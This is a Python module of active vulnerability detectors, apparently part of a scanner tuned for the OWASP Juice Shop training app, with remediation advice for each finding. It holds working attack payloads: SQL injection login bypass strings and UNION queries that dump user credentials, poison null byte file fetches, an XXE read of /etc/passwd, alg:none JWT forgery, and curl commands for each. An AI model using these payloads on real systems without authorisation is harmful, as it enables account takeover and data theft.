"""
Active detectors — CONFIRM real vulnerabilities against live endpoints.

Unlike the advisory guidance engine (which says "here is where/how to test"),
these send safe, non-destructive probes to the actual application and report
findings that are CONFIRMED with response evidence. They are deeply aware of
OWASP Juice Shop's real endpoints and map hits to specific challenges, while
staying generic enough to fire on any app.

SAFETY: only read/verify probes here. Destructive challenges (RCE/XXE/NoSQL DoS,
memory bomb, arbitrary file write — Juice Shop's "Danger Zone") are deliberately
NOT auto-fired; they remain advisory playbooks.
"""
from __future__ import annotations

import base64
import hashlib
import json
import ssl
import urllib.error
import urllib.request
from typing import Any, Optional

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE
UA = "RoundTable/2 detector"


# ── low-level HTTP ──────────────────────────────────────────────────────────
def _req(method, url, headers=None, data=None, timeout=12, retries=2):
    import time
    h = {"User-Agent": UA}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    last = (None, {}, "")
    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=body, headers=h, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=_CTX) as r:
                raw = r.read(300_000)
                return r.status, dict(r.headers), raw.decode("utf-8", "ignore")
        except urllib.error.HTTPError as e:  # a real HTTP status — not a transport failure
            try:
                raw = e.read(300_000).decode("utf-8", "ignore")
            except Exception:
                raw = ""
            return e.code, dict(e.headers), raw
        except Exception:
            last = (None, {}, "")
            if attempt < retries:
                time.sleep(1.0 + attempt)  # target may be briefly saturated by the scan
    return last


def _get(url, **kw):
    return _req("GET", url, **kw)


def _post(url, data, **kw):
    return _req("POST", url, data=data, **kw)


def _gid(*p):
    return "det_" + hashlib.sha1("|".join(p).encode()).hexdigest()[:9]


def _finding(*, key, title, category, severity, surface, evidence, what, how,
             challenges=None, payloads=None, tools=None, curl_steps=None,
             references=None, remediation=None, tags=None, confidence=90):
    return {
        "id": _gid(key, surface),
        "key": key,
        "title": title,
        "category": category,
        "wstg": "",
        "severity": severity.upper(),
        "confidence": confidence,
        "confidence_label": "Confirmed" if confidence >= 85 else "High",
        "confirmed": confidence >= 85,
        "surface": surface,
        "evidence": evidence,
        "what_to_test": what,
        "how_to_test": how,
        "payloads": payloads or [],
        "tools": tools or ["curl", "Burp Suite"],
        "curl_steps": curl_steps or [],
        "references": references or [],
        "challenges": challenges or [],
        "tags": (tags or []) + (["confirmed"] if confidence >= 85 else []),
        "remediation": remediation,
    }


# ── fingerprint ─────────────────────────────────────────────────────────────
def is_juice_shop(base: str) -> Optional[str]:
    st, _, body = _get(f"{base}/rest/admin/application-version")
    if st == 200 and body.strip().startswith("{") and "version" in body:
        try:
            return json.loads(body).get("version", "unknown")
        except Exception:
            return "unknown"
    st, _, body = _get(base)
    if "OWASP Juice Shop" in body:
        return "unknown"
    return None


# ── detectors ───────────────────────────────────────────────────────────────
def d_sqli_login(base):
    for payload in ("' OR 1=1--", "admin@juice-sh.op'--", "' OR true--"):
        st, _, body = _post(f"{base}/rest/user/login", {"email": payload, "password": "x"})
        if st == 200 and ("authentication" in body or '"token"' in body):
            return _finding(
                key="sqli-authbypass", title="SQL injection — authentication bypass (CONFIRMED)",
                category="Injection", severity="CRITICAL", surface=f"{base}/rest/user/login",
                evidence=f"POST /rest/user/login with email={payload!r} returned 200 + an auth token — login bypassed.",
                what="The login query is string-built; an injected boolean logs in as the first/admin user.",
                how=["Repeat the curl below and confirm you receive an authentication token.",
                     "Escalate: dump users with a UNION on /rest/products/search (see Database Schema)."],
                payloads=["' OR 1=1--", "admin@juice-sh.op'--"],
                tools=["curl", "Burp Suite", "sqlmap"],
                curl_steps=[{"desc": "Auth bypass", "cmd":
                    f"curl -sS -k -X POST {base}/rest/user/login -H 'Content-Type: application/json' "
                    f"--data-raw '{{\"email\":\"{payload}\",\"password\":\"x\"}}'"}],
                challenges=["Login Admin", "Login Jim", "Login Bender", "User Credentials"],
                references=[{"title": "WSTG-INPV-05 · SQL Injection", "url": "https://portswigger.net/web-security/sql-injection"}],
                remediation={"summary": "Use parameterized queries / an ORM binding for the login lookup; never string-build SQL from the email field.", "fixes": []},
                tags=["sqli", "auth", "injection"],
            )
    return None


def d_sqli_search(base):
    st, _, body = _get(f"{base}/rest/products/search?q=%27")
    markers = ("SQLITE_ERROR", "SequelizeDatabaseError", "syntax error", "SQLITE_", "near \"", "unrecognized token")
    if st and st >= 500 and any(m in body for m in markers) or (st == 500 and "error" in body.lower()):
        hit = next((m for m in markers if m in body), "500 SQL error")
        return _finding(
            key="sqli-search", title="SQL injection in product search (CONFIRMED)",
            category="Injection", severity="HIGH", surface=f"{base}/rest/products/search?q=",
            evidence=f"GET /rest/products/search?q=' returned {st} with SQL error marker: {hit!r}.",
            what="The search q parameter is concatenated into a SQL query, enabling UNION-based extraction.",
            how=["Reproduce with the curl below.",
                 "Build a UNION SELECT to exfiltrate the schema, then the Users table (email, password hash)."],
            payloads=["qwert')) UNION SELECT sql, '2','3','4','5','6','7','8','9' FROM sqlite_master--",
                      "qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"],
            tools=["curl", "Burp Suite", "sqlmap"],
            curl_steps=[{"desc": "Trigger SQL error", "cmd": f"curl -sS -k \"{base}/rest/products/search?q=%27\""}],
            challenges=["Database Schema", "User Credentials"],
            references=[{"title": "WSTG-INPV-05 · SQL Injection", "url": "https://portswigger.net/web-security/sql-injection"}],
            remediation={"summary": "Parameterize the search query; validate/escape the q parameter server-side.", "fixes": []},
            tags=["sqli", "injection"],
        )
    return None


def d_ftp(base):
    st, _, body = _get(f"{base}/ftp/")
    files_of_interest = {
        "acquisition.md": ("Confidential Document", "confidential"),
        "coupons_2013.md.bak": ("Forged Coupon / Poison Null Byte", "coupon source / null-byte target"),
        "package.json.bak": ("Vulnerable Library", "dependency manifest"),
        "eastere.gg": ("Easter Egg", "hidden file"),
        "legal.md": ("Confidential Document", "legal doc"),
        "encrypt.pyc": ("Nested Easter Egg", "crypto artifact"),
        "suspicious_errors.yml": ("Misplaced Signature File", "SIEM signature"),
    }
    accessible = []
    if st == 200 and ("Index of" in body or ".md" in body or ".bak" in body):
        accessible.append("/ftp/ directory listing")
    for f, (chal, note) in files_of_interest.items():
        s2, _, _ = _get(f"{base}/ftp/{f}")
        if s2 == 200:
            accessible.append(f"/ftp/{f} ({note})")
    if accessible:
        return _finding(
            key="ftp-exposure", title="Exposed /ftp static files — sensitive data (CONFIRMED)",
            category="Sensitive Data Exposure", severity="HIGH", surface=f"{base}/ftp/",
            evidence="Accessible: " + "; ".join(accessible[:8]),
            what="The /ftp folder serves confidential docs and forgotten backups directly.",
            how=["Download each file below.",
                 "For .bak/.md.bak blocked by extension filter, use a Poison Null Byte: append %2500.md."],
            payloads=["/ftp/coupons_2013.md.bak%2500.md", "/ftp/package.json.bak%2500.md"],
            tools=["curl", "browser"],
            curl_steps=[{"desc": "List /ftp", "cmd": f"curl -sS -k {base}/ftp/"},
                        {"desc": "Poison null byte fetch", "cmd": f"curl -sS -k '{base}/ftp/coupons_2013.md.bak%2500.md'"}],
            challenges=["Confidential Document", "Forged Coupon", "Poison Null Byte", "Vulnerable Library", "Easter Egg"],
            references=[{"title": "WSTG-CONF-04 · Backup/Unreferenced Files", "url": "https://owasp.org/www-project-web-security-testing-guide/"}],
            remediation={"summary": "Do not serve backup/confidential files from the web root; remove /ftp exposure and add extension allow-listing without null-byte bypass.", "fixes": []},
            tags=["disclosure", "secrets"],
        )
    return None


def d_metrics(base):
    st, _, body = _get(f"{base}/metrics")
    if st == 200 and ("# HELP" in body or "# TYPE" in body):
        return _finding(
            key="metrics", title="Prometheus metrics endpoint exposed (CONFIRMED)",
            category="Observability", severity="MEDIUM", surface=f"{base}/metrics",
            evidence="GET /metrics returned Prometheus exposition format (# HELP/# TYPE).",
            what="Unauthenticated metrics can leak internal counts, routes, and usage patterns.",
            how=["Fetch /metrics and review exposed series."],
            tools=["curl"],
            curl_steps=[{"desc": "Read metrics", "cmd": f"curl -sS -k {base}/metrics | head"}],
            challenges=["Exposed Metrics"],
            remediation={"summary": "Bind /metrics to an internal interface or require auth; do not expose it publicly.", "fixes": []},
            tags=["disclosure", "config"],
        )
    return None


def d_app_config(base):
    st, _, body = _get(f"{base}/rest/admin/application-configuration")
    if st == 200 and "config" in body:
        return _finding(
            key="app-config", title="Application configuration disclosed unauthenticated (CONFIRMED)",
            category="Security Misconfiguration", severity="MEDIUM", surface=f"{base}/rest/admin/application-configuration",
            evidence="GET /rest/admin/application-configuration returned the full app config without auth.",
            what="Public config leaks feature flags, theme, and challenge hints an attacker can leverage.",
            how=["Fetch the endpoint and review the JSON for secrets/flags (e.g., ctf/coupon settings)."],
            tools=["curl"],
            curl_steps=[{"desc": "Dump config", "cmd": f"curl -sS -k {base}/rest/admin/application-configuration"}],
            challenges=["Security Misconfiguration"],
            remediation={"summary": "Require authentication/authorization for admin configuration endpoints.", "fixes": []},
            tags=["disclosure", "config"],
        )
    return None


def d_error_handling(base):
    st, _, body = _get(f"{base}/rest/products/search?q[]=x")
    if st and st >= 400 and any(m in body for m in ("SequelizeDatabaseError", "at Function", "stack", "Error:", "SQLITE")):
        return _finding(
            key="error-handling", title="Verbose error / stack trace disclosure (CONFIRMED)",
            category="Security Misconfiguration", severity="MEDIUM", surface=f"{base}/rest/products/search",
            evidence=f"An array/malformed q parameter produced a {st} with an unhandled error/stack trace.",
            what="Inconsistent error handling leaks stack traces, ORM internals, and file paths.",
            how=["Send a malformed parameter and capture the verbose error body."],
            payloads=["?q[]=x", "?q=%27%29%29"],
            tools=["curl", "Burp Suite"],
            curl_steps=[{"desc": "Trigger error", "cmd": f"curl -sS -k \"{base}/rest/products/search?q[]=x\""}],
            challenges=["Error Handling"],
            remediation={"summary": "Return generic error responses; never leak stack traces to clients.", "fixes": []},
            tags=["config", "disclosure"],
        )
    return None


def d_scoreboard(base):
    st, _, idx = _get(base)
    if st != 200:
        return None
    import re
    for m in re.findall(r'(?:src|href)="([^"]*main[^"]*\.js)"', idx)[:3]:
        url = m if m.startswith("http") else base.rstrip("/") + "/" + m.lstrip("/")
        s2, _, js = _get(url)
        if s2 == 200 and "score-board" in js:
            return _finding(
                key="scoreboard", title="Hidden Score Board route present in JS bundle (CONFIRMED)",
                category="Security through Obscurity", severity="LOW", surface=f"{base}/#/score-board",
                evidence=f"'score-board' route found in the JS bundle ({url.split('/')[-1]}).",
                what="Client-side routing exposes hidden pages once the bundle is read.",
                how=["Open the app then browse to /#/score-board directly."],
                tools=["browser", "curl"],
                curl_steps=[{"desc": "Grep the bundle", "cmd": f"curl -sS -k {url} | grep -o score-board | head -1"}],
                challenges=["Score Board"],
                tags=["disclosure"],
            )
    return None


def d_rest_feedback(base):
    st, _, body = _get(f"{base}/api/Feedbacks/")
    if st == 200 and '"data"' in body and "comment" in body:
        return _finding(
            key="feedback-exposure", title="All customer feedback readable unauthenticated (CONFIRMED)",
            category="Broken Access Control", severity="MEDIUM", surface=f"{base}/api/Feedbacks/",
            evidence="GET /api/Feedbacks returned every feedback record (with comments/ratings) without auth.",
            what="Object collections exposed without authorization leak other users' content.",
            how=["Fetch the collection and review for sensitive comments / captcha answers."],
            tools=["curl"],
            curl_steps=[{"desc": "Read all feedback", "cmd": f"curl -sS -k {base}/api/Feedbacks/"}],
            challenges=["Five-Star Feedback", "Forged Feedback"],
            remediation={"summary": "Enforce authorization on collection endpoints; scope reads to the owning user where applicable.", "fixes": []},
            tags=["access-control", "idor"],
        )
    return None


def d_jwt(base):
    # Reuse the SQLi login to obtain a token, then inspect the JWT.
    st, _, body = _post(f"{base}/rest/user/login", {"email": "' OR 1=1--", "password": "x"})
    tok = ""
    try:
        tok = json.loads(body).get("authentication", {}).get("token", "") if st == 200 else ""
    except Exception:
        tok = ""
    if tok and tok.count(".") == 2:
        try:
            hdr = json.loads(base64.urlsafe_b64decode(tok.split(".")[0] + "=="))
        except Exception:
            hdr = {}
        return _finding(
            key="jwt", title="JWT in use — test signature/alg confusion", category="Broken Authentication",
            severity="HIGH", surface=f"{base}/rest/user/login", confidence=70,
            evidence=f"Session uses a JWT (alg={hdr.get('alg','?')}). Test alg:none and RSA→HMAC confusion.",
            what="Juice Shop accepts an unsigned (alg:none) JWT and an RSA-signed forgery for non-existent users.",
            how=["Decode the token; re-sign with alg 'none' impersonating jwtn3d@juice-sh.op.",
                 "For the RSA challenge, forge with the app's public key using HS256 confusion."],
            payloads=["{\"alg\":\"none\",\"typ\":\"JWT\"} . {\"email\":\"jwtn3d@juice-sh.op\"} ."],
            tools=["jwt_tool", "Burp JWT Editor", "curl"],
            curl_steps=[{"desc": "Grab a token", "cmd": f"curl -sS -k -X POST {base}/rest/user/login -H 'Content-Type: application/json' --data-raw '{{\"email\":\"'\\'' OR 1=1--\",\"password\":\"x\"}}'"}],
            challenges=["Unsigned JWT", "Forged Signed JWT"],
            references=[{"title": "WSTG-SESS-10 · JWT", "url": "https://portswigger.net/web-security/jwt"}],
            remediation={"summary": "Reject alg:none, pin the expected algorithm, and verify signatures against the correct key type.", "fixes": []},
            tags=["jwt", "auth"],
        )
    return None


def d_deprecated_b2b(base):
    st, _, body = _get(f"{base}/b2b/v1/orders")
    st2, _, _ = _get(f"{base}/b2b/v2/orders")
    if (st and st != 404) or (st2 and st2 != 404):
        return _finding(
            key="b2b", title="Deprecated B2B order interface reachable (CONFIRMED)",
            category="Security Misconfiguration", severity="MEDIUM", surface=f"{base}/b2b/v2/orders",
            evidence=f"/b2b order interface responded ({st or st2}) instead of 404 — legacy XML endpoint still live.",
            what="A not-fully-retired B2B endpoint that parses XML → XXE surface.",
            how=["POST XML to the B2B endpoint and test for XXE (external entity to /etc/passwd)."],
            payloads=["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><order>&x;</order>"],
            tools=["curl", "Burp Suite"],
            curl_steps=[{"desc": "Probe B2B", "cmd": f"curl -sS -k -i {base}/b2b/v2/orders"}],
            challenges=["Deprecated Interface", "XXE Data Access"],
            remediation={"summary": "Retire deprecated interfaces fully; disable external entities in the XML parser.", "fixes": []},
            tags=["config", "xxe"],
        )
    return None


DETECTORS = [
    d_sqli_login, d_sqli_search, d_ftp, d_metrics, d_app_config,
    d_error_handling, d_scoreboard, d_rest_feedback, d_jwt, d_deprecated_b2b,
]


def run_detectors(base: str, log=None) -> list[dict]:
    base = base.rstrip("/")
    out = []
    js_ver = is_juice_shop(base)
    if log and js_ver:
        log(f"detectors: OWASP Juice Shop confirmed (v{js_ver}) at {base}", "ok", "detect")
    for det in DETECTORS:
        try:
            f = det(base)
            if f:
                out.append(f)
                if log:
                    log(f"CONFIRMED: {f['title']} [{', '.join(f.get('challenges', [])[:2])}]", "ok", "detect")
        except Exception as e:
            if log:
                log(f"detector {det.__name__} error: {type(e).__name__}", "warn", "detect")
    return out
